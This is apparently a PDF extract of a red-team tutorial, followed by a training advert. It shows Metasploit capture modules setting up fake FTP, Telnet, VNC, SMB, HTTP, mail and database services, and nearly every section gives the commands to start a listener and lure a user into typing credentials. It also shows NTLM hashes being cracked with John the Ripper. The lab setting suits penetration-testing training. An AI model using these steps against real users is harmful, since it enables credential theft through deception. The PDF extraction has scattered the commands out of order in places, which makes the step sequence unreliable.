---
id: ckb-328dede7793f
title: Credential Dumping Fake Services
category: offensive-security
format: guide
language: en
tags: [credential-access, metasploit, red-team]
summary: This guide demonstrates how to use Metasploit auxiliary modules to set up fake network services such as FTP, Telnet, VNC, and SMB to capture user authentication credentials and password hashes.
authors: [unknown]
license: NOASSERTION
added: 2026-10-04
classification:
  method: llm
  model: gemini-3.5-flash-lite
  confidence: 0.98
classified_by: google:gemini-3.5-flash-lite@2026-10-08T00:39:30Z
---

 Page 2 of 18

Contents
Introduction ........................................................................................... 3
FTP .......................................................................................................... 3
Telnet ...................................................................................................... 4
VNC ......................................................................................................... 6
SMB ........................................................................................................ 7
http_basic ............................................................................................. 10
POP3 ..................................................................................................... 11
SMTP ..................................................................................................... 12
PostgreSQL ........................................................................................... 13
MsSQL ................................................................................................... 14
http_ntlm ............................................................................................. 15
MySQL .................................................................................................. 17
Conclusion: ........................................................................................... 18

 Page 3 of 18

Introduction
In Metasploit by making use of auxiliary modules, you can fake any server of choice and gain the
credentials of the victim.  For your server to be used, you can make use of the search command to look
for modules. So, to get you started, switch on your Kali Linux machines and start Metasploit using the
command

FTP
FTP stands for 'file transferring Protocol' used for the transfer of computer files between a client and
server on a computer network at port 21. This module provides a fake FTP service that is designed to
capture authentication credentials.
To achieve this, you can type

Here you see that the server has started and the module is running.

On doing a Nmap scan with the FTP port and IP address, you can see that the port is open.

Now, to lure the user into believing, it to be a genuine login page, you can trick the user into opening the
ftp login page. It will display, "Welcome to Hacking Articles" and will ask the user to put in his user ID and
password.
According to the user, it would be a genuine page and he would put in his user ID and password.
msfconsole
use auxiliary/server/capture/ftp
set srvhost 192.168.0.102
 set banner Welcome to Hacking Articles
exploit
nmap -p21 192.168.0.102
ftp 192.168.0.102

 Page 4 of 18

It will show the user that the login is failed, but the user ID and password will be captured by the listener.
You see that the ID /Password is

Telnet
Telnet is a networking protocol that allows a user on one computer to log into another computer that is
part of the same network at port 23. This module provides a fake Telnet service that is designed to capture
authentication credentials.
To achieve this, you can type

raj/123
use auxiliary/server/capture/telnet
set banner Welcome to Hacking Articles
set srvhost 192.168.0.102
exploit

 Page 5 of 18

On doing a Nmap scan with the Telnet port and IP address, you can see that the port is open.
Now to lure the user into believing, it to be a genuine login page you can trick the user into opening the
Telnet login page. It will display, ‘Welcome to Hacking Articles’ and it will ask the user to put his user Id
and password.
According to the user, it would be a genuine page, he will put his user ID and password.

It will show the user that the login is failed, but the user ID and password will be captured by the listener.
You see that the ID /Password is

nmap -p23 192.168.0.102
telnet 192.168.0.102
ignite/123

 Page 6 of 18

VNC
VNC Virtual Network Computing is a graphical desktop sharing system that uses the Remote Frame Buffer
protocol to remotely control another computer at port 5900. This module provides a fake VNC service
that is designed to capture authentication credentials.
To achieve this, you can type

Here we use the JOHNPWFILE option to save the captured hashes in John the Ripper format. Here we see
that the module is running and the listener has started.

On doing a Nmap scan with the vnc port and IP address, you can see that the port is open.

According to the user, it would be a genuine page, as on starting the vncviewer he will put his user ID and
password.
use auxiliary/server/capture/vnc
set srvhost 192.168.0.102
set johnpwfile /root/Desktop/
exploit
nmap -p5900 192.168.0.102
vncviewer 192.168.0.102

 Page 7 of 18

It will show that there was an authentication failure, but the hash for the password has been captured.

SMB
SMB stands for server message block which is used to share printers, files etc at port 445. This module
provides an SMB service that can be used to capture the challenge-response password hashes of the SMB
client system.
To achieve this, you can type

The server capture credentials in a hash value which can be cracked later, therefore the johnpwfile of
John the Ripper

On doing a Nmap scan with the smb port and IP address, you can see that the port is open

use auxiliary/server/capture/smb
set johnpwfile /root/ Desktop/
set srvhost 192.168.0.102
exploit
nmap -p445 192.168.0.102

 Page 8 of 18

As a result, this module will now generate a spoofed window security prompt on the victim’s system to
establish a connection with another system in order to access shared folders of that system.

It will show the user that the login failed, but the credentials will be captured by the listener. Here you
can see that the listener has captured the user and the domain name. It has also generated an NT hash
which can be decrypted with John the Ripper.

 Page 9 of 18

Here you can see that the hash file generated on the desktop can be decrypted using

And here you see that the password is in text form, 123 for user Raj.
john _netntlmv2

 Page 10 of 18

http_basic
This module responds to all requests for resources with an HTTP 401. This should cause most browsers to
prompt for a credential. If the user enters Basic Auth creds, they are sent to the console. This may be
helpful in some phishing expeditions where it is possible to embed a resource into a page.
To exploit HTTP (80), you can type

As a result, this module will now generate a spoofed login prompt on the victim’s system when an http
URL is opened.
use auxiliary/server/capture/ http_basic
set RedirectURL www.hackingarticles.in
set srvhost 192.168.0.102
set uripath sales
exploit

 Page 11 of 18

It will show the user that the login is failed, but the user ID and password will be captured by the listener.
You see that the ID /Password is

POP3
POP3 is a client/server protocol in which e-mail is received and held for you by your Internet server at
port 110. This module provides a fake POP3 service that is designed to capture authentication credentials.
To achieve this, you can type

On doing a Nmap scan with the POP3 port and IP address, you can see that the port is open

raj/123
use auxiliary/server/capture/pop3
set srvhost 192.168.0.102
exploit
nmap -p110 192.168.0.102
telnet 192.168.0.102 110

 Page 12 of 18

According to the user, it would be a genuine page, he will put his user ID and password.

You see that the User /Password captured by the listener is

SMTP
SMTP stands for Simple Mail Transfer Protocol which is a communication protocol for electronic mail
transmission at port 25. This module provides a fake SMTP service that is designed to capture
authentication credentials
To achieve this, you can type

raj/123
use auxiliary/server/capture/smtp
set srvhost 192.168.0.102
exploit

 Page 13 of 18

On doing a Nmap scan with the SMTP port and IP address, you can see that the port is open

According to the user, it would be a genuine page, he will put his user ID and password.

On adding the ID and password, it will show a server error to the user, but it will be captured by the
listener

PostgreSQL
Postgresql is an open-source database that is widely available at port 5432. This module provides a fake
PostgreSQL service that is designed to capture clear-text authentication credentials.

nmap -p25 <ip address>
telnet 192.168.0.102 25
raj/123
use auxiliary/server/capture/postgresql
set srvhost 192.168.0.102
exploit

 Page 14 of 18

On doing a Nmap scan with the PostgreSQL port and IP address, you can see that the port is open

According to the user, it would be a genuine page, he will put his user ID and password

On adding the ID and password, it will show a server error to the user, but it will be captured by the
listener

MsSQL
Mssql is a Microsoft-developed database management system that is widely available at 1433. This
module provides a fake MSSQL service that is designed to capture authentication credentials. This module
support both the weakly encoded database logins as well as Windows logins (NTLM).
To achieve this,

nmap -p5432 <ip address>
psql -h 192.168.0.102 -U raj
raj/123
use auxiliary/server/capture/mssql
set srvhost 192.168.0.102
exploit

 Page 15 of 18

It will open a fake Microsoft session manager window. According to the user, it would be a genuine page,
he will put his user ID and password.

On adding the ID and password, it will show a server error to the user, but it will be captured by the
listener

http_ntlm
The http_ntlm capture module tries to quietly catch NTLM challenge hashes over HTTP.

User/ID: raj/123
use auxiliary/server/capture/ http_ntlm
set johnpwfile /root/Desktop/
set srvhost 192.168.0.102
set uripath report
exploit

 Page 16 of 18

As a result, this module will now generate a spoofed login prompt on the victim’s system when an http
URL is opened.

It will show the user that the login failed, but the credentials will be captured by the listener. Here you
can see that the listener has captured the user and the domain name. It has also generated an NT hash
which can be decrypted with John the ripper

And here you see that the password Here you can see that the hash file generated on the desktop can be
decrypted using

And here you see that the password is in text form, 123 for user Raj.
john _netntlmv2

 Page 17 of 18

MySQL
It is an open-source database management system at port 3306. This module provides a fake MySQL
service that is designed to capture authentication credentials. It captures challenge and response pairs
that can be supplied at John the Ripper for cracking.
To achieve this,

On doing a Nmap scan with the MySql port and IP address, you can see that the port is open

According to the user, it would be a genuine page, he will put his user ID and password.
use auxiliary/server/capture/mysql
set srvhost 192.168.0.102
exploit
nmap -p3306 <ip address>
mysql -h 192.168.0.102 -u root -p

 Page 18 of 18

You see that the User /Password captured by the listener is

Conclusion:
Hence, by using these various auxiliary modules, you can exploit the various open ports and create fake
servers and capture credentials.

1234
JOIN OUR
TRAINING PROGRAMS
www.ignitetechnologies.in
BEGINNER
Network Pentest
Bug Bounty
Wireless Pentest
Network Security
Essentials
Ethical Hacking
ADVANCED
EXPERT
Burp Suite Pro
CTF
Windows
Linux
Pro
Infrastructure VAPT
APT’s - MITRE Attack Tactics
MSSQL Security Assessment
Active Directory Attack
Red Team Operation
Privilege Escalation
Web
Services-API
Android Pentest
Computer
Forensics
Advanced
Metasploit
CLICK HERE
